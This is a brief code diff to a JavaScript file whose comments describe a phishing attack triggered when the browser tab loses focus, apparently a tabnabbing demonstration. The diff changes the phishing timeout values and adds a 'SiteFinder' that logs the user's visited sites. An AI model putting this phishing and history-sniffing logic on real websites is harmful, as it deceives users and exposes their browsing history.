@@ -5,11 +5,14 @@
 *
 */
 
-var min_timeout = 2000,
-	max_timeout = 3000;
+var min_timeout = 9992000,
+	max_timeout = 9993000;
 
 // Binds the phishing attack to the blurring event
 window.onblur = start_phishing_timeout;
+
+var sitefinder = new SiteFinder();
+console.log(sitefinder.visitedSites);
 
 // Counts down to zero from (between max_timeout & min_timeout)
 // and calls the phishing process
